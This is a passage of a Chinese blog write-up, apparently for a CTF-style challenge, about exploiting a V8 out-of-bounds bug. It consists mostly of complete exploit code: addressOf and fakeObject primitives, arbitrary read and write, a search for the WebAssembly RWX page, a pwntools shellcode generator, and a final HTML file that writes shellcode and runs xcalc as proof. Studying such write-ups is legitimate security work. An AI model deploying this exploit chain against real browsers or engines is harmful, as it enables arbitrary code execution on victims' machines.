+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;shared_info_addr: 0x&#34;</span> <span style=color:#666>+</span> shared_info_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> data_addr <span style=color:#666>=</span> read64(shared_info_addr <span style=color:#666>-</span><span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;data_addr: 0x&#34;</span> <span style=color:#666>+</span> data_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> instance_addr <span style=color:#666>=</span> read64(data_addr <span style=color:#666>-</span><span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;instance_addr: 0x&#34;</span> <span style=color:#666>+</span> instance_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> rwx_addr <span style=color:#666>=</span> read64(instance_addr <span style=color:#666>-</span> <span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x88</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;rwx_addr: 0x&#34;</span> <span style=color:#666>+</span> rwx_addr.toString(<span style=color:#40a070>16</span>));
+</span></span></code></pre></div><p>然后需要生成一段 shellcode，这里使用了小语写的脚本生成</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 小语写的脚本</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>just8</span>(data):
+</span></span><span style=display:flex><span>    size <span style=color:#666>=</span> <span style=color:#007020>len</span>(data)
+</span></span><span style=display:flex><span>    real_size <span style=color:#666>=</span> size <span style=color:#007020;font-weight:700>if</span> size <span style=color:#666>%</span> <span style=color:#40a070>8</span> <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#007020;font-weight:700>else</span> size <span style=color:#666>+</span> (<span style=color:#40a070>8</span> <span style=color:#666>-</span> size <span style=color:#666>%</span> <span style=color:#40a070>8</span>)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> data<span style=color:#666>.</span>ljust(real_size, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>to_js</span>(data):
+</span></span><span style=display:flex><span>    ret <span style=color:#666>=</span> <span style=color:#4070a0>&#39;var sc_arr = [&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>, <span style=color:#007020>len</span>(data), <span style=color:#40a070>8</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>//</span> <span style=color:#40a070>8</span>) <span style=color:#666>%</span> <span style=color:#40a070>4</span> <span style=color:#666>==</span> <span style=color:#40a070>0</span>:
+</span></span><span style=display:flex><span>            ret <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>        x <span style=color:#666>=</span> u64(data[i:i<span style=color:#666>+</span><span style=color:#40a070>8</span>])
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>        ret <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(x) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;n,&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    ret <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>]</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> ret
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>call_exec</span>(path, argv, envp):
+</span></span><span style=display:flex><span>    sc <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    sc <span style=color:#666>+=</span> shellcraft<span style=color:#666>.</span>pushstr(path)
+</span></span><span style=display:flex><span>    sc <span style=color:#666>+=</span> shellcraft<span style=color:#666>.</span>mov(<span style=color:#4070a0>&#39;rdi&#39;</span>, <span style=color:#4070a0>&#39;rsp&#39;</span>)
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    sc <span style=color:#666>+=</span> shellcraft<span style=color:#666>.</span>pushstr_array(<span style=color:#4070a0>&#39;rsi&#39;</span>, argv)
+</span></span><span style=display:flex><span>    sc <span style=color:#666>+=</span> shellcraft<span style=color:#666>.</span>pushstr_array(<span style=color:#4070a0>&#39;rdx&#39;</span>, envp)
+</span></span><span style=display:flex><span>    sc <span style=color:#666>+=</span> shellcraft<span style=color:#666>.</span>syscall(<span style=color:#4070a0>&#39;SYS_execve&#39;</span>)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> sc
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sc <span style=color:#666>=</span> <span style=color:#4070a0>&#39;&#39;</span>
+</span></span><span style=display:flex><span>sc <span style=color:#666>=</span> call_exec(<span style=color:#4070a0>&#39;/usr/bin/xcalc&#39;</span>, [<span style=color:#4070a0>&#39;xcalc&#39;</span>], [<span style=color:#4070a0>&#39;DISPLAY=:0&#39;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(sc)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#666>=</span> asm(sc)
+</span></span><span style=display:flex><span>data <span style=color:#666>=</span> just8(data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(to_js(data))
+</span></span></code></pre></div><p>为了证明利用的完成，这里调用的是一个计算器，为了执行图形程序，需要设置 DISPLAY 环境变量，一般置为 0 即可。</p><p>执行脚本后可以得到这样一个数组</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> sc_arr <span style=color:#666>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x10101010101b848</span>n,    <span style=color:#40a070>0x62792eb848500101</span>n,    <span style=color:#40a070>0x431480101626d60</span>n,    <span style=color:#40a070>0x2f7273752fb84824</span>n,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x48e78948506e6962</span>n,    <span style=color:#40a070>0x1010101010101b8</span>n,    <span style=color:#40a070>0x6d606279b8485001</span>n,    <span style=color:#40a070>0x2404314801010162</span>n,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x1485e086a56f631</span>n,    <span style=color:#40a070>0x313b68e6894856e6</span>n,    <span style=color:#40a070>0x101012434810101</span>n,    <span style=color:#40a070>0x4c50534944b84801</span>n,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x6a52d231503d5941</span>n,    <span style=color:#40a070>0x894852e201485a08</span>n,    <span style=color:#40a070>0x50f583b6ae2</span>n,
+</span></span><span style=display:flex><span>];
+</span></span></code></pre></div><p>之后如果直接使用之前实现的 write64 函数会出现一个段错误。小语说这是 <code>write64</code> FloatArray 对浮点数的处理方式造成的，当值以 0x7f 开头等高处的地址都会出现这种问题，小语说可以使用 DataView 来改写任意写的方式来解决了这个问题。</p><p>小语说 DataView 对象偏移 <code>+0x20</code> 处，存有一个 backing_store 指针，该指针指向真正存储数据的地址，改写这个指针即可任意读写，而且不会发生 FloatArray 出现的问题，他写了个 poc</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buffer <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> ArrayBuffer(<span style=color:#40a070>16</span>);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> data_view <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(buffer);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buf_backing_store_addr <span style=color:#666>=</span> addressOf(buffer) <span style=color:#666>-</span> <span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x20</span>n;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>function</span> write64_view(addr, value)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	write64(buf_backing_store_addr, addr);
+</span></span><span style=display:flex><span>	data_view.setFloat64(<span style=color:#40a070>0</span>, i2f(value), <span style=color:#007020;font-weight:700>true</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>利用这种方式就可以写 shellcode 了。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> dataview_buffer <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> ArrayBuffer(sc_arr.length <span style=color:#666>*</span> <span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> data_view <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(dataview_buffer);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buf_backing_store_addr <span style=color:#666>=</span> addressOf(dataview_buffer) <span style=color:#666>-</span><span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x20</span>n
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>write64(buf_backing_store_addr, rwx_addr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span>(<span style=color:#007020;font-weight:700>let</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> sc_arr.length; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    data_view.setFloat64(i <span style=color:#666>*</span> <span style=color:#40a070>8</span>, i2f(sc_arr[i]), <span style=color:#007020;font-weight:700>true</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>最后整理成为一个 html 文件</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#062873;font-weight:700>script</span>&gt;
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float_arr <span style=color:#666>=</span> [<span style=color:#40a070>1.1</span>];
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> obj <span style=color:#666>=</span> {<span style=color:#4070a0>&#34;a&#34;</span> <span style=color:#666>:</span> <span style=color:#40a070>1</span>};
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> object_arr <span style=color:#666>=</span> [obj];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float_arr_map <span style=color:#666>=</span> float_arr.oob();
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> object_arr_map <span style=color:#666>=</span> object_arr.oob();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// get the address of obj
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {object} obj: obj to leak
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {uint64}: address of obj 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> addressOf(obj) {
+</span></span><span style=display:flex><span>    object_arr[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> obj;
+</span></span><span style=display:flex><span>    object_arr.oob(float_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>let</span> address <span style=color:#666>=</span> object_arr[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>    object_arr.oob(object_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> f2i(address);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// return a object which address is `address` 
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// return object (*address);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {object}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> fakeObject(address) {
+</span></span><span style=display:flex><span>    float_arr[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i2f(address);
+</span></span><span style=display:flex><span>    float_arr.oob(object_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>let</span> obj <span style=color:#666>=</span> float_arr[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>    float_arr.oob(float_arr_map);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> obj;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buf <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> ArrayBuffer(<span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> float64 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Float64Array(buf);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> uint64 <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> BigUint64Array(buf);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {float64} float_num
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {uint64}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> f2i(float_num) {
+</span></span><span style=display:flex><span>    float64[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> float_num;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> uint64[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} uint64_num
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {float64}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> i2f(uint64_num) {
+</span></span><span style=display:flex><span>    uint64[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> uint64_num;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> float64[<span style=color:#40a070>0</span>];
+</span></span><span style=display:flex><span>} 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> rw_tool <span style=color:#666>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// map
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    float_arr_map,
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// prototype
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(<span style=color:#40a070>0</span>n),
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// elements
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(<span style=color:#40a070>0xBEEFDEAD</span>n),
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// length
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(<span style=color:#40a070>0x1000000000</span>n),
+</span></span><span style=display:flex><span>    <span style=color:#40a070>1.1</span>,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>1.2</span>
+</span></span><span style=display:flex><span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> rw_tool_addr <span style=color:#666>=</span> addressOf(rw_tool);
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;rw_tool_addr: 0x&#34;</span> <span style=color:#666>+</span> rw_tool_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> arbitary_rw_obj <span style=color:#666>=</span> fakeObject(rw_tool_addr <span style=color:#666>-</span> <span style=color:#40a070>0x30</span>n);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// return *((uint64*) address)
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @return {uint64}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> read64(address) {
+</span></span><span style=display:flex><span>    rw_tool[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> i2f(address <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>n <span style=color:#666>+</span> <span style=color:#40a070>1</span>n);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> f2i(arbitary_rw_obj[<span style=color:#40a070>0</span>]);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// *((uint64*) address) = val
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} val
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>function</span> write64(address, val) {
+</span></span><span style=display:flex><span>    rw_tool[<span style=color:#40a070>2</span>] <span style=color:#666>=</span> i2f(address <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>n <span style=color:#666>+</span> <span style=color:#40a070>1</span>n);
+</span></span><span style=display:flex><span>    arbitary_rw_obj[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i2f(val);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// *((uint64*) address) = val
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} address
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// @param {uint64} val
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>function write64_view(address, val) {
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>    write64(buf_backing_store_addr, address);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>    // data_view.setBigUint64(0, val, true);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>    data_view.setFloat64(0, i2f(val), true);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>}
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>*/</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> wasmCode <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Uint8Array([<span style=color:#40a070>0</span>,<span style=color:#40a070>97</span>,<span style=color:#40a070>115</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>133</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>96</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>127</span>,<span style=color:#40a070>3</span>,<span style=color:#40a070>130</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>4</span>,<span style=color:#40a070>132</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>112</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>5</span>,<span style=color:#40a070>131</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>6</span>,<span style=color:#40a070>129</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>7</span>,<span style=color:#40a070>145</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>2</span>,<span style=color:#40a070>6</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>101</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>111</span>,<span style=color:#40a070>114</span>,<span style=color:#40a070>121</span>,<span style=color:#40a070>2</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>4</span>,<span style=color:#40a070>109</span>,<span style=color:#40a070>97</span>,<span style=color:#40a070>105</span>,<span style=color:#40a070>110</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>10</span>,<span style=color:#40a070>138</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,<span style=color:#40a070>132</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>128</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>0</span>,<span style=color:#40a070>65</span>,<span style=color:#40a070>42</span>,<span style=color:#40a070>11</span>]);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> wasmModule <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> WebAssembly.Module(wasmCode);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> wasmInstance <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> WebAssembly.Instance(wasmModule, {});
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> f <span style=color:#666>=</span> wasmInstance.exports.main;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>addr_f <span style=color:#666>=</span> addressOf(f);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>console.log(f());
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;f_addr: 0x&#34;</span> <span style=color:#666>+</span> addr_f.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> shared_info_addr <span style=color:#666>=</span> read64(addr_f <span style=color:#666>-</span> <span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x18</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;shared_info_addr: 0x&#34;</span> <span style=color:#666>+</span> shared_info_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> data_addr <span style=color:#666>=</span> read64(shared_info_addr <span style=color:#666>-</span><span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;data_addr: 0x&#34;</span> <span style=color:#666>+</span> data_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> instance_addr <span style=color:#666>=</span> read64(data_addr <span style=color:#666>-</span><span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;instance_addr: 0x&#34;</span> <span style=color:#666>+</span> instance_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> rwx_addr <span style=color:#666>=</span> read64(instance_addr <span style=color:#666>-</span> <span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x88</span>n)
+</span></span><span style=display:flex><span>console.log(<span style=color:#4070a0>&#34;rwx_addr: 0x&#34;</span> <span style=color:#666>+</span> rwx_addr.toString(<span style=color:#40a070>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> sc_arr <span style=color:#666>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x10101010101b848</span>n,    <span style=color:#40a070>0x62792eb848500101</span>n,    <span style=color:#40a070>0x431480101626d60</span>n,    <span style=color:#40a070>0x2f7273752fb84824</span>n,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x48e78948506e6962</span>n,    <span style=color:#40a070>0x1010101010101b8</span>n,    <span style=color:#40a070>0x6d606279b8485001</span>n,    <span style=color:#40a070>0x2404314801010162</span>n,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x1485e086a56f631</span>n,    <span style=color:#40a070>0x313b68e6894856e6</span>n,    <span style=color:#40a070>0x101012434810101</span>n,    <span style=color:#40a070>0x4c50534944b84801</span>n,
+</span></span><span style=display:flex><span>    <span style=color:#40a070>0x6a52d231503d5941</span>n,    <span style=color:#40a070>0x894852e201485a08</span>n,    <span style=color:#40a070>0x50f583b6ae2</span>n,
+</span></span><span style=display:flex><span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> dataview_buffer <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> ArrayBuffer(sc_arr.length <span style=color:#666>*</span> <span style=color:#40a070>8</span>);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> data_view <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> DataView(dataview_buffer);
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>var</span> buf_backing_store_addr <span style=color:#666>=</span> addressOf(dataview_buffer) <span style=color:#666>-</span><span style=color:#40a070>1</span>n <span style=color:#666>+</span> <span style=color:#40a070>0x20</span>n
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>write64(buf_backing_store_addr, rwx_addr);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span>(<span style=color:#007020;font-weight:700>let</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> sc_arr.length; i<span style=color:#666>++</span>) {
+</span></span><span style=display:flex><span>    data_view.setFloat64(i <span style=color:#666>*</span> <span style=color:#40a070>8</span>, i2f(sc_arr[i]), <span style=color:#007020;font-weight:700>true</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
